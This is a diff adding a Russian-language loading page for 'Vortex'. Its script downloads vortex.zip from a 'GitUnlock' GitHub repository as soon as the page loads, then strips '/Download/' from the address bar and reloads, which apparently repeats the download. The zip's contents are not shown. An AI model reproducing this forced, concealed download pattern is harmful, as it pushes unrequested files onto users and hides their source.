@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vortex | Загрузка</title>
+    <meta name="theme-color" content="#000000">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background: linear-gradient(-45deg, #000000, #333333, #666666);
+            background-size: 400% 400%;
+            animation: gradientAnimation 15s ease infinite;
+        }
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #7b1fa2;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        (function() {
+            // 1. Немедленно начинаем скачивание
+            const downloadLink = document.createElement('a');
+            downloadLink.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
+            downloadLink.download = 'vortex.zip';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+
+            // 2. Очищаем URL после начала скачивания
+            setTimeout(() => {
+                const currentUrl = window.location.href;
+                if (currentUrl.includes('/Download/')) {
+                    const cleanUrl = currentUrl.replace('/Download/', '/');
+                    history.replaceState(null, null, cleanUrl);
+                }
+
+                // 3. Перезагружаем страницу через 3 секунды (гарантированное время для скачивания)
+                setTimeout(() => {
+                    window.location.reload();
+                }, 3000);
+                
+                // Удаляем ссылку через 5 секунд (очистка)
+                setTimeout(() => {
+                    document.body.removeChild(downloadLink);
+                }, 5000);
+            }, 100);
+        })();
+    </script>
+</body>
+</html>
